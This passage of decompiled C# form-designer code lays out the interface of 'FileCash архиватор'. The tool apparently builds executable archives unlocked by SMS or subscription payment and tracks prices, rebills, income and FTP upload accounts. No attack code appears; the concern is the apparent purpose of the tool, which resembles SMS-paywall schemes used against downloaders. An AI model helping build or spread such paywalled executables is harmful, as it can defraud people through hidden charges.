      this.SelectArchivePrice.DrawItem += new DrawItemEventHandler(this.comboBox_DrawItem);
      this.label39.AutoSize = true;
      this.label39.BackColor = Color.FromArgb(228, 235, 231);
      this.label39.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label39.ForeColor = SystemColors.InfoText;
      this.label39.Location = new Point(155, 4);
      this.label39.Name = "label39";
      this.label39.Size = new Size(100, 14);
      this.label39.TabIndex = 34;
      this.label39.Text = "Стоимость (СМС):";
      this.SelectPaymentType.DrawMode = DrawMode.OwnerDrawFixed;
      this.SelectPaymentType.DropDownStyle = ComboBoxStyle.DropDownList;
      this.SelectPaymentType.FormattingEnabled = true;
      this.SelectPaymentType.Items.AddRange(new object[3]
      {
        (object) "Оплата СМС",
        (object) "Оплата СМС + Подписка",
        (object) "Оплата Подписка"
      });
      this.SelectPaymentType.Location = new Point(10, 19);
      this.SelectPaymentType.Name = "SelectPaymentType";
      this.SelectPaymentType.Size = new Size(133, 21);
      this.SelectPaymentType.TabIndex = 33;
      this.SelectPaymentType.DrawItem += new DrawItemEventHandler(this.comboBox_DrawItem);
      this.label25.AutoSize = true;
      this.label25.BackColor = Color.FromArgb(228, 235, 231);
      this.label25.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label25.ForeColor = SystemColors.InfoText;
      this.label25.Location = new Point(7, 4);
      this.label25.Name = "label25";
      this.label25.Size = new Size(83, 14);
      this.label25.TabIndex = 33;
      this.label25.Text = "Метод оплаты:";
      this.SelectArchiveLangage.DrawMode = DrawMode.OwnerDrawFixed;
      this.SelectArchiveLangage.DropDownStyle = ComboBoxStyle.DropDownList;
      this.SelectArchiveLangage.FormattingEnabled = true;
      this.SelectArchiveLangage.Items.AddRange(new object[2]
      {
        (object) "Русский",
        (object) "Английский"
      });
      this.SelectArchiveLangage.Location = new Point(173, 309);
      this.SelectArchiveLangage.Name = "SelectArchiveLangage";
      this.SelectArchiveLangage.Size = new Size(133, 21);
      this.SelectArchiveLangage.TabIndex = 55;
      this.SelectArchiveLangage.DrawItem += new DrawItemEventHandler(this.comboBox_DrawItem);
      this.label52.AutoSize = true;
      this.label52.BackColor = Color.White;
      this.label52.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label52.ForeColor = SystemColors.InfoText;
      this.label52.Location = new Point(170, 292);
      this.label52.Name = "label52";
      this.label52.Size = new Size(76, 14);
      this.label52.TabIndex = 54;
      this.label52.Text = "Язык архива:";
      this.UseMyIcon.AutoSize = true;
      this.UseMyIcon.BackColor = Color.Transparent;
      this.UseMyIcon.Location = new Point(320, 312);
      this.UseMyIcon.Name = "UseMyIcon";
      this.UseMyIcon.Size = new Size(101, 18);
      this.UseMyIcon.TabIndex = 53;
      this.UseMyIcon.Text = "Использовать";
      this.UseMyIcon.UseVisualStyleBackColor = false;
      this.UseMyIcon.CheckedChanged += new EventHandler(this.UseMyIcon_CheckedChanged);
      this.label50.AutoSize = true;
      this.label50.BackColor = Color.White;
      this.label50.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label50.ForeColor = SystemColors.InfoText;
      this.label50.Location = new Point(317, 292);
      this.label50.Name = "label50";
      this.label50.Size = new Size(115, 14);
      this.label50.TabIndex = 49;
      this.label50.Text = "Собственная иконка:";
      this.SelectArchiveStyle.DrawMode = DrawMode.OwnerDrawFixed;
      this.SelectArchiveStyle.DropDownStyle = ComboBoxStyle.DropDownList;
      this.SelectArchiveStyle.FormattingEnabled = true;
      this.SelectArchiveStyle.Location = new Point(26, 309);
      this.SelectArchiveStyle.Name = "SelectArchiveStyle";
      this.SelectArchiveStyle.Size = new Size(133, 21);
      this.SelectArchiveStyle.TabIndex = 47;
      this.SelectArchiveStyle.DrawItem += new DrawItemEventHandler(this.comboBox_DrawItem);
      this.SelectArchiveStyle.SelectedIndexChanged += new EventHandler(this.SelectArchiveStyle_SelectedIndexChanged);
      this.label49.AutoSize = true;
      this.label49.BackColor = Color.White;
      this.label49.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label49.ForeColor = SystemColors.InfoText;
      this.label49.Location = new Point(22, 292);
      this.label49.Name = "label49";
      this.label49.Size = new Size(81, 14);
      this.label49.TabIndex = 46;
      this.label49.Text = "Стиль архива:";
      this.SavedProfiles.FormattingEnabled = true;
      this.SavedProfiles.Location = new Point(368, 220);
      this.SavedProfiles.Name = "SavedProfiles";
      this.SavedProfiles.Size = new Size(133, 22);
      this.SavedProfiles.TabIndex = 25;
      this.SavedProfiles.SelectedIndexChanged += new EventHandler(this.SavedProfiles_SelectedIndexChanged);
      this.label41.AutoSize = true;
      this.label41.Location = new Point(12, 225);
      this.label41.Name = "label41";
      this.label41.Size = new Size(350, 14);
      this.label41.TabIndex = 24;
      this.label41.Text = "Выберите созданый ранее профиль настроек или создайте новый:";
      this.label40.AutoSize = true;
      this.label40.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label40.ForeColor = Color.FromArgb(53, 88, 81);
      this.label40.Location = new Point(12, 207);
      this.label40.Name = "label40";
      this.label40.Size = new Size(119, 15);
      this.label40.TabIndex = 23;
      this.label40.Text = "Профиль настроек";
      this.label47.AutoSize = true;
      this.label47.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label47.ForeColor = Color.FromArgb(53, 88, 81);
      this.label47.Location = new Point(11, 17);
      this.label47.Name = "label47";
      this.label47.Size = new Size(166, 21);
      this.label47.TabIndex = 0;
      this.label47.Text = "Создание архива";
      this.Menu_styleList_cont.BackColor = Color.Transparent;
      this.Menu_styleList_cont.Controls.Add((Control) this.StyleListView);
      this.Menu_styleList_cont.Controls.Add((Control) this.label55);
      this.Menu_styleList_cont.Location = new Point(163, 120);
      this.Menu_styleList_cont.Name = "Menu_styleList_cont";
      this.Menu_styleList_cont.Size = new Size(167, 48);
      this.Menu_styleList_cont.TabIndex = 35;
      this.Menu_styleList_cont.Visible = false;
      this.StyleListView.AllowColumnReorder = true;
      this.StyleListView.Columns.AddRange(new ColumnHeader[4]
      {
        this.columnHeader14,
        this.columnHeader15,
        this.columnHeader16,
        this.columnHeader7
      });
      this.StyleListView.FullRowSelect = true;
      this.StyleListView.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.StyleListView.Location = new Point(12, 49);
      this.StyleListView.MultiSelect = false;
      this.StyleListView.Name = "StyleListView";
      this.StyleListView.Size = new Size(493, 363);
      this.StyleListView.TabIndex = 14;
      this.StyleListView.UseCompatibleStateImageBehavior = false;
      this.StyleListView.View = View.Details;
      this.StyleListView.VisibleChanged += new EventHandler(this.StyleListView_VisibleChanged);
      this.columnHeader14.Text = "Название";
      this.columnHeader14.Width = 115;
      this.columnHeader15.Text = "Создан";
      this.columnHeader15.Width = 104;
      this.columnHeader16.Text = "Статус";
      this.columnHeader16.Width = 107;
      this.columnHeader7.Text = "Примечание";
      this.columnHeader7.Width = 159;
      this.label55.AutoSize = true;
      this.label55.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label55.ForeColor = Color.FromArgb(53, 88, 81);
      this.label55.Location = new Point(11, 17);
      this.label55.Name = "label55";
      this.label55.Size = new Size(143, 21);
      this.label55.TabIndex = 0;
      this.label55.Text = "Список стилей";
      this.Menu_archiveList_cont.BackColor = Color.Transparent;
      this.Menu_archiveList_cont.Controls.Add((Control) this.button6);
      this.Menu_archiveList_cont.Controls.Add((Control) this.ArchiveListView);
      this.Menu_archiveList_cont.Controls.Add((Control) this.label51);
      this.Menu_archiveList_cont.Controls.Add((Control) this.label60);
      this.Menu_archiveList_cont.Location = new Point(15, 119);
      this.Menu_archiveList_cont.Name = "Menu_archiveList_cont";
      this.Menu_archiveList_cont.Size = new Size(134, 48);
      this.Menu_archiveList_cont.TabIndex = 33;
      this.Menu_archiveList_cont.Visible = false;
      this.Menu_archiveList_cont.VisibleChanged += new EventHandler(this.Menu_archiveList_cont_VisibleChanged);
      this.button6.Location = new Point(12, 376);
      this.button6.Name = "button6";
      this.button6.Size = new Size(105, 30);
      this.button6.TabIndex = 15;
      this.button6.Text = "Удалить";
      this.button6.UseVisualStyleBackColor = true;
      this.button6.Click += new EventHandler(this.button6_Click);
      this.ArchiveListView.AllowColumnReorder = true;
      this.ArchiveListView.Columns.AddRange(new ColumnHeader[7]
      {
        this.AID,
        this.ArchiveName,
        this.ArchiveCreated,
        this.ArchivePrice,
        this.AllowSubs,
        this.ArchiveUnpakSum,
        this.Sum
      });
      this.ArchiveListView.FullRowSelect = true;
      this.ArchiveListView.Location = new Point(12, 49);
      this.ArchiveListView.MultiSelect = false;
      this.ArchiveListView.Name = "ArchiveListView";
      this.ArchiveListView.Size = new Size(493, 316);
      this.ArchiveListView.TabIndex = 14;
      this.ArchiveListView.UseCompatibleStateImageBehavior = false;
      this.ArchiveListView.View = View.Details;
      this.ArchiveListView.ColumnClick += new ColumnClickEventHandler(this.ArchiveListView_ColumnClick);
      this.AID.Text = "ID";
      this.AID.Width = 33;
      this.ArchiveName.Text = "Имя архива";
      this.ArchiveName.Width = 121;
      this.ArchiveCreated.Text = "Создан";
      this.ArchiveCreated.Width = 87;
      this.ArchivePrice.Text = "Стоимость";
      this.ArchivePrice.Width = 72;
      this.AllowSubs.Text = "Подписки";
      this.ArchiveUnpakSum.Text = "Оплат";
      this.ArchiveUnpakSum.Width = 68;
      this.Sum.Text = "Доход";
      this.Sum.Width = 46;
      this.label51.AutoSize = true;
      this.label51.ForeColor = Color.DarkRed;
      this.label51.Location = new Point(122, 376);
      this.label51.Name = "label51";
      this.label51.Size = new Size(372, 28);
      this.label51.TabIndex = 13;
      this.label51.Text = "Обратите внимание, что зачисление на ваш аккаунт статистики\r\n(подписки,ребилы,смс и т.п.) по удаленным архивам не производятся.";
      this.label51.TextAlign = ContentAlignment.MiddleLeft;
      this.label60.AutoSize = true;
      this.label60.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label60.ForeColor = Color.FromArgb(53, 88, 81);
      this.label60.Location = new Point(11, 17);
      this.label60.Name = "label60";
      this.label60.Size = new Size(156, 21);
      this.label60.TabIndex = 0;
      this.label60.Text = "Список архивов";
      this.Menu_FTP_cont.BackColor = Color.Transparent;
      this.Menu_FTP_cont.Controls.Add((Control) this.DeleteFTP);
      this.Menu_FTP_cont.Controls.Add((Control) this.AddFTP);
      this.Menu_FTP_cont.Controls.Add((Control) this.FtpList);
      this.Menu_FTP_cont.Controls.Add((Control) this.label6);
      this.Menu_FTP_cont.Location = new Point(340, 110);
      this.Menu_FTP_cont.Name = "Menu_FTP_cont";
      this.Menu_FTP_cont.Size = new Size(168, 49);
      this.Menu_FTP_cont.TabIndex = 35;
      this.Menu_FTP_cont.Visible = false;
      this.Menu_FTP_cont.VisibleChanged += new EventHandler(this.Menu_FTP_cont_VisibleChanged);
      this.DeleteFTP.Location = new Point(93, 388);
      this.DeleteFTP.Name = "DeleteFTP";
      this.DeleteFTP.Size = new Size(75, 23);
      this.DeleteFTP.TabIndex = 16;
      this.DeleteFTP.Text = "Удалить";
      this.DeleteFTP.UseVisualStyleBackColor = true;
      this.DeleteFTP.Click += new EventHandler(this.DeleteFTP_Click);
      this.AddFTP.Location = new Point(12, 388);
      this.AddFTP.Name = "AddFTP";
      this.AddFTP.Size = new Size(75, 23);
      this.AddFTP.TabIndex = 15;
      this.AddFTP.Text = "Добавить";
      this.AddFTP.UseVisualStyleBackColor = true;
      this.AddFTP.Click += new EventHandler(this.AddFTP_Click);
      this.FtpList.Activation = ItemActivation.OneClick;
      this.FtpList.Columns.AddRange(new ColumnHeader[6]
      {
        this.FtpName,
        this.FtpServer,
        this.FtpPort,
        this.FtpPath,
        this.FtpLogin,
        this.FtpPass
      });
      this.FtpList.FullRowSelect = true;
      this.FtpList.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.FtpList.Location = new Point(12, 49);
      this.FtpList.MultiSelect = false;
      this.FtpList.Name = "FtpList";
      this.FtpList.Size = new Size(493, 333);
      this.FtpList.TabIndex = 14;
      this.FtpList.UseCompatibleStateImageBehavior = false;
      this.FtpList.View = View.Details;
      this.FtpName.Text = "Имя";
      this.FtpName.Width = 65;
      this.FtpServer.Text = "Сервер";
      this.FtpServer.Width = 101;
      this.FtpPort.Text = "Порт";
      this.FtpPort.Width = 40;
      this.FtpPath.Text = "Путь";
      this.FtpPath.Width = 128;
      this.FtpLogin.Text = "Логин";
      this.FtpLogin.Width = 77;
      this.FtpPass.Text = "Пароль";
      this.FtpPass.Width = 78;
      this.label6.AutoSize = true;
      this.label6.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label6.ForeColor = Color.FromArgb(53, 88, 81);
      this.label6.Location = new Point(11, 17);
      this.label6.Name = "label6";
      this.label6.Size = new Size(207, 21);
      this.label6.TabIndex = 0;
      this.label6.Text = "Список FTP-серверов";
      this.Tab_addvance_panel.BackColor = Color.Transparent;
      this.Tab_addvance_panel.Controls.Add((Control) this.panel7);
      this.Tab_addvance_panel.Controls.Add((Control) this.Menu_FTP);
      this.Tab_addvance_panel.Controls.Add((Control) this.Menu_statistic);
      this.Tab_addvance_panel.Controls.Add((Control) this.label33);
      this.Tab_addvance_panel.Controls.Add((Control) this.label34);
      this.Tab_addvance_panel.Location = new Point(340, 5);
      this.Tab_addvance_panel.Name = "Tab_addvance_panel";
      this.Tab_addvance_panel.Size = new Size(168, 47);
      this.Tab_addvance_panel.TabIndex = 28;
      this.Tab_addvance_panel.Visible = false;
      this.Tab_addvance_panel.MouseEnter += new EventHandler(this.MainPanel_MouseEnter);
      this.panel7.Controls.Add((Control) this.label26);
      this.panel7.Controls.Add((Control) this.pictureBox6);
      this.panel7.Controls.Add((Control) this.label27);
      this.panel7.Cursor = Cursors.Hand;
      this.panel7.Location = new Point(17, 253);
      this.panel7.Name = "panel7";
      this.panel7.Size = new Size(494, 66);
      this.panel7.TabIndex = 16;
      this.panel7.Visible = false;
      this.panel7.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.label26.AutoSize = true;
      this.label26.Location = new Point(93, 28);
      this.label26.Name = "label26";
      this.label26.Size = new Size(350, 14);
      this.label26.TabIndex = 11;
      this.label26.Text = "Настройки программы: обновления, уведомления, режим запуска.";
      this.label26.TextAlign = ContentAlignment.MiddleLeft;
      this.label26.Click += new EventHandler(this.Menu_Click);
      this.pictureBox6.Image = (Image) Resources._3_3_options;
      this.pictureBox6.Location = new Point(30, 8);
      this.pictureBox6.Name = "pictureBox6";
      this.pictureBox6.Size = new Size(48, 48);
      this.pictureBox6.TabIndex = 4;
      this.pictureBox6.TabStop = false;
      this.pictureBox6.Click += new EventHandler(this.Menu_Click);
      this.label27.AutoSize = true;
      this.label27.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label27.ForeColor = Color.FromArgb(53, 88, 81);
      this.label27.Location = new Point(93, 8);
      this.label27.Name = "label27";
      this.label27.Size = new Size(160, 17);
      this.label27.TabIndex = 10;
      this.label27.Text = "Настройки программы";
      this.label27.Click += new EventHandler(this.Menu_Click);
      this.Menu_FTP.Controls.Add((Control) this.label28);
      this.Menu_FTP.Controls.Add((Control) this.pictureBox7);
      this.Menu_FTP.Controls.Add((Control) this.label29);
      this.Menu_FTP.Cursor = Cursors.Hand;
      this.Menu_FTP.Location = new Point(17, 177);
      this.Menu_FTP.Name = "Menu_FTP";
      this.Menu_FTP.Size = new Size(494, 66);
      this.Menu_FTP.TabIndex = 15;
      this.Menu_FTP.Click += new EventHandler(this.Menu_Click);
      this.Menu_FTP.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.label28.AutoSize = true;
      this.label28.Location = new Point(93, 29);
      this.label28.Name = "label28";
      this.label28.Size = new Size(370, 28);
      this.label28.TabIndex = 9;
      this.label28.Text = "Управление FTP-аккаунтами, необходимыми для загрузки архивов на \r\nFTP-сервер после архивации.";
      this.label28.TextAlign = ContentAlignment.MiddleLeft;
      this.label28.Click += new EventHandler(this.Menu_Click);
      this.pictureBox7.Image = (Image) Resources._3_2_ftpacs;
      this.pictureBox7.Location = new Point(30, 9);
      this.pictureBox7.Name = "pictureBox7";
      this.pictureBox7.Size = new Size(48, 48);
      this.pictureBox7.TabIndex = 3;
      this.pictureBox7.TabStop = false;
      this.pictureBox7.Click += new EventHandler(this.Menu_Click);
      this.label29.AutoSize = true;
      this.label29.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label29.ForeColor = Color.FromArgb(53, 88, 81);
      this.label29.Location = new Point(93, 9);
      this.label29.Name = "label29";
      this.label29.Size = new Size(112, 17);
      this.label29.TabIndex = 8;
      this.label29.Text = "FTP - аккаунты";
      this.label29.Click += new EventHandler(this.Menu_Click);
      this.Menu_statistic.Controls.Add((Control) this.label31);
      this.Menu_statistic.Controls.Add((Control) this.label30);
      this.Menu_statistic.Controls.Add((Control) this.pictureBox8);
      this.Menu_statistic.Cursor = Cursors.Hand;
      this.Menu_statistic.Location = new Point(17, 101);
      this.Menu_statistic.Name = "Menu_statistic";
      this.Menu_statistic.Size = new Size(494, 66);
      this.Menu_statistic.TabIndex = 14;
      this.Menu_statistic.Click += new EventHandler(this.Menu_Click);
      this.Menu_statistic.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.label31.AutoSize = true;
      this.label31.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label31.ForeColor = Color.FromArgb(53, 88, 81);
      this.label31.Location = new Point(93, 9);
      this.label31.Name = "label31";
      this.label31.Size = new Size(136, 17);
      this.label31.TabIndex = 6;
      this.label31.Text = "Общая статистика";
      this.label31.Click += new EventHandler(this.Menu_Click);
      this.label30.AutoSize = true;
      this.label30.Location = new Point(93, 29);
      this.label30.Name = "label30";
      this.label30.Size = new Size(346, 28);
      this.label30.TabIndex = 7;
      this.label30.Text = "Просмотр общей статистики за текущую неделю. Для просмотра \r\nподробной статистики, перейдите в web-статистику.";
      this.label30.TextAlign = ContentAlignment.MiddleLeft;
      this.label30.Click += new EventHandler(this.Menu_Click);
      this.pictureBox8.Image = (Image) Resources._3_1_stat;
      this.pictureBox8.Location = new Point(30, 9);
      this.pictureBox8.Name = "pictureBox8";
      this.pictureBox8.Size = new Size(48, 48);
      this.pictureBox8.SizeMode = PictureBoxSizeMode.CenterImage;
      this.pictureBox8.TabIndex = 2;
      this.pictureBox8.TabStop = false;
      this.pictureBox8.Click += new EventHandler(this.Menu_Click);
      this.label33.AutoSize = true;
      this.label33.Location = new Point(14, 44);
      this.label33.Name = "label33";
      this.label33.Size = new Size(473, 28);
      this.label33.TabIndex = 1;
      this.label33.Text = "В данном разделе Вы можете просмотреть статистику, а также указать дополнительные \r\nпараметры работы программы.";
      this.label33.TextAlign = ContentAlignment.MiddleLeft;
      this.label34.AutoSize = true;
      this.label34.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label34.ForeColor = Color.FromArgb(53, 88, 81);
      this.label34.Location = new Point(11, 17);
      this.label34.Name = "label34";
      this.label34.Size = new Size(153, 21);
      this.label34.TabIndex = 0;
      this.label34.Text = "Дополнительно";
      this.Menu_Tasks_cont.BackColor = Color.Transparent;
      this.Menu_Tasks_cont.Controls.Add((Control) this.TaskList);
      this.Menu_Tasks_cont.Controls.Add((Control) this.label2);
      this.Menu_Tasks_cont.Location = new Point(15, 184);
      this.Menu_Tasks_cont.Name = "Menu_Tasks_cont";
      this.Menu_Tasks_cont.Size = new Size(134, 43);
      this.Menu_Tasks_cont.TabIndex = 35;
      this.Menu_Tasks_cont.Visible = false;
      this.TaskList.Columns.AddRange(new ColumnHeader[3]
      {
        this.ArchiveN,
        this.Progress,
        this.Status
      });
      this.TaskList.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.TaskList.Location = new Point(12, 49);
      this.TaskList.MultiSelect = false;
      this.TaskList.Name = "TaskList";
      this.TaskList.Size = new Size(493, 357);
      this.TaskList.TabIndex = 14;
      this.TaskList.UseCompatibleStateImageBehavior = false;
      this.TaskList.View = View.Details;
      this.ArchiveN.Text = "Имя архива";
      this.ArchiveN.Width = 130;
      this.Progress.Text = "Прогресс";
      this.Progress.Width = 257;
      this.Status.Text = "Статус";
      this.Status.Width = 100;
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label2.ForeColor = Color.FromArgb(53, 88, 81);
      this.label2.Location = new Point(11, 17);
      this.label2.Name = "label2";
      this.label2.Size = new Size(85, 21);
      this.label2.TabIndex = 0;
      this.label2.Text = "Задания";
      this.Menu_Project_cont.BackColor = Color.Transparent;
      this.Menu_Project_cont.Controls.Add((Control) this.deleteProject);
      this.Menu_Project_cont.Controls.Add((Control) this.ProjectList);
      this.Menu_Project_cont.Controls.Add((Control) this.label7);
      this.Menu_Project_cont.Location = new Point(15, 246);
      this.Menu_Project_cont.Name = "Menu_Project_cont";
      this.Menu_Project_cont.Size = new Size(134, 57);
      this.Menu_Project_cont.TabIndex = 36;
      this.Menu_Project_cont.Visible = false;
      this.deleteProject.Location = new Point(12, 391);
      this.deleteProject.Name = "deleteProject";
      this.deleteProject.Size = new Size(75, 23);
      this.deleteProject.TabIndex = 15;
      this.deleteProject.Text = "Удалить";
      this.deleteProject.UseVisualStyleBackColor = true;
      this.deleteProject.Click += new EventHandler(this.deleteProject_Click);
      this.ProjectList.Columns.AddRange(new ColumnHeader[2]
      {
        this.ProjectName,
        this.ProjectType
      });
      this.ProjectList.FullRowSelect = true;
      this.ProjectList.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.ProjectList.Location = new Point(12, 49);
      this.ProjectList.MultiSelect = false;
      this.ProjectList.Name = "ProjectList";
      this.ProjectList.Size = new Size(493, 339);
      this.ProjectList.TabIndex = 14;
      this.ProjectList.UseCompatibleStateImageBehavior = false;
      this.ProjectList.View = View.Details;
      this.ProjectName.Text = "Название";
      this.ProjectName.Width = 372;
      this.ProjectType.Text = "Тип";
      this.ProjectType.Width = 114;
      this.label7.AutoSize = true;
      this.label7.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label7.ForeColor = Color.FromArgb(53, 88, 81);
      this.label7.Location = new Point(11, 17);
      this.label7.Name = "label7";
      this.label7.Size = new Size(89, 21);
      this.label7.TabIndex = 0;
      this.label7.Text = "Проекты";
      this.notifyIcon1.Icon = (Icon) componentResourceManager.GetObject("notifyIcon1.Icon");
      this.notifyIcon1.Text = "FileCash архиватор";
      this.notifyIcon1.Visible = true;
      this.notifyIcon1.Click += new EventHandler(this.notifyIcon1_MouseDoubleClick);
      this.AddFileMenu.MenuItems.AddRange(new MenuItem[3]
      {
        this.AddFile,
        this.AddFolder,
        this.RunProject
      });
      this.AddFile.Index = 0;
      this.AddFile.Text = "Добавить файл";
      this.AddFile.Click += new EventHandler(this.AddFile_Click);
      this.AddFolder.Index = 1;
      this.AddFolder.Text = "Добавить папку";
      this.AddFolder.Click += new EventHandler(this.AddFolder_Click);
      this.RunProject.Index = 2;
      this.RunProject.Text = "Выполнить проект";
      this.FileAdd_Dialog.FileName = "FileAdd_Dialog";
      this.FileAdd_Dialog.FileOk += new CancelEventHandler(this.FileAdd_Dialog_FileOk);
      this.news1head.AutoSize = true;
      this.news1head.BackColor = Color.Transparent;
      this.news1head.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel, (byte) 204);
      this.news1head.ForeColor = SystemColors.ButtonHighlight;
      this.news1head.Location = new Point(14, 361);
      this.news1head.Name = "news1head";
      this.news1head.Size = new Size(73, 15);
      this.news1head.TabIndex = 33;
      this.news1head.Text = "news1head";
      this.news1txt.ActiveLinkColor = SystemColors.Window;
      this.news1txt.AutoSize = true;
      this.news1txt.BackColor = Color.Transparent;
      this.news1txt.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel, (byte) 204);
      this.news1txt.LinkColor = SystemColors.Window;
      this.news1txt.Location = new Point(14, 377);
      this.news1txt.Name = "news1txt";
      this.news1txt.Size = new Size(53, 14);
      this.news1txt.TabIndex = 34;
      ((Label) this.news1txt).TabStop = true;
      this.news1txt.Text = "news1txt";
      this.news1txt.VisitedLinkColor = SystemColors.Window;
      this.news1txt.Click += new EventHandler(this.NewsClick);
      this.news2txt.ActiveLinkColor = SystemColors.Window;
      this.news2txt.AutoSize = true;
      this.news2txt.BackColor = Color.Transparent;
      this.news2txt.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel, (byte) 204);
      this.news2txt.LinkColor = SystemColors.Window;
      this.news2txt.Location = new Point(14, 420);
      this.news2txt.Name = "news2txt";
      this.news2txt.Size = new Size(53, 14);
      this.news2txt.TabIndex = 36;
      ((Label) this.news2txt).TabStop = true;
      this.news2txt.Text = "news2txt";
      this.news2txt.VisitedLinkColor = SystemColors.Window;
      this.news2txt.Click += new EventHandler(this.NewsClick);
      this.news2head.AutoSize = true;
      this.news2head.BackColor = Color.Transparent;
      this.news2head.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel, (byte) 204);
      this.news2head.ForeColor = SystemColors.ButtonHighlight;
      this.news2head.Location = new Point(14, 404);
      this.news2head.Name = "news2head";
      this.news2head.Size = new Size(73, 15);
      this.news2head.TabIndex = 35;
      this.news2head.Text = "news2head";
      this.news3txt.ActiveLinkColor = SystemColors.Window;
      this.news3txt.AutoSize = true;
      this.news3txt.BackColor = Color.Transparent;
      this.news3txt.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel, (byte) 204);
      this.news3txt.LinkColor = SystemColors.Window;
      this.news3txt.Location = new Point(14, 467);
      this.news3txt.Name = "news3txt";
      this.news3txt.Size = new Size(53, 14);
      this.news3txt.TabIndex = 38;
      ((Label) this.news3txt).TabStop = true;
      this.news3txt.Text = "news3txt";
      this.news3txt.VisitedLinkColor = SystemColors.Window;
      this.news3txt.Click += new EventHandler(this.NewsClick);
      this.news3head.AutoSize = true;
      this.news3head.BackColor = Color.Transparent;
      this.news3head.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel, (byte) 204);
      this.news3head.ForeColor = SystemColors.ButtonHighlight;
      this.news3head.Location = new Point(14, 450);
      this.news3head.Name = "news3head";
      this.news3head.Size = new Size(73, 15);
      this.news3head.TabIndex = 37;
      this.news3head.Text = "news3head";
      this.timer1.Enabled = true;
      this.timer1.Interval = 60000;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.flowLayoutPanel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.flowLayoutPanel1.BackColor = Color.Transparent;
      this.flowLayoutPanel1.Controls.Add((Control) this.TXT_UpdateInfo2);
      this.flowLayoutPanel1.Controls.Add((Control) this.TXT_UpdateTime);
      this.flowLayoutPanel1.Controls.Add((Control) this.TXT_UpdateInfo);
      this.flowLayoutPanel1.FlowDirection = FlowDirection.RightToLeft;
      this.flowLayoutPanel1.Location = new Point(506, 537);
      this.flowLayoutPanel1.Margin = new Padding(0);
      this.flowLayoutPanel1.Name = "flowLayoutPanel1";
      this.flowLayoutPanel1.Size = new Size(280, 103);
      this.flowLayoutPanel1.TabIndex = 39;
      this.flowLayoutPanel2.BackColor = Color.Transparent;
      this.flowLayoutPanel2.Controls.Add((Control) this.Link_NewMsgCount);
      this.flowLayoutPanel2.Controls.Add((Control) this.TXT_newMsg);
      this.flowLayoutPanel2.Controls.Add((Control) this.Link_support);
      this.flowLayoutPanel2.FlowDirection = FlowDirection.RightToLeft;
      this.flowLayoutPanel2.Location = new Point(524, 7);
      this.flowLayoutPanel2.Name = "flowLayoutPanel2";
      this.flowLayoutPanel2.Size = new Size(264, 19);
      this.flowLayoutPanel2.TabIndex = 40;
      this.ICO_OpenDialog.FileName = "ICO_OpenDialog";
      this.ICO_OpenDialog.Filter = "Image Files (ICO)|*.ico";
      this.ICO_OpenDialog.FileOk += new CancelEventHandler(this.ICO_OpenDialog_FileOk);
      this.saveFileDialog1.DefaultExt = "exe";
      this.OldFileBrouseDialog.Filter = "Executable|*.exe";
      this.TimerBackgWorker.WorkerReportsProgress = true;
      this.TimerBackgWorker.WorkerSupportsCancellation = true;
      this.TimerBackgWorker.DoWork += new DoWorkEventHandler(this.TimerBackgWorker_DoWork);
      this.TimerBackgWorker.ProgressChanged += new ProgressChangedEventHandler(this.TimerBackgWorker_ProgressChanged);
      this.ImgBrouseDlg.Filter = "Image Files |*.jpg";
      this.ImgBrouseDlg.Title = "Выберите пользовательскую картинку 177x345";
      this.AutoScaleDimensions = new SizeF(6f, 14f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ControlLightLight;
      this.BackgroundImage = (Image) Resources.centercash_mainform;
      this.BackgroundImageLayout = ImageLayout.None;
      this.ClientSize = new Size(789, 558);
      this.Controls.Add((Control) this.flowLayoutPanel2);
      this.Controls.Add((Control) this.flowLayoutPanel1);
      this.Controls.Add((Control) this.news3txt);
      this.Controls.Add((Control) this.news3head);
      this.Controls.Add((Control) this.news2txt);
      this.Controls.Add((Control) this.news2head);
      this.Controls.Add((Control) this.news1txt);
      this.Controls.Add((Control) this.news1head);
      this.Controls.Add((Control) this.Cont_Main);
      this.Controls.Add((Control) this.Tab_addvance_hover);
      this.Controls.Add((Control) this.Tab_styles_hover);
      this.Controls.Add((Control) this.Tab_archivation_hover);
      this.Controls.Add((Control) this.MonthSum);
      this.Controls.Add((Control) this.WeekSum);
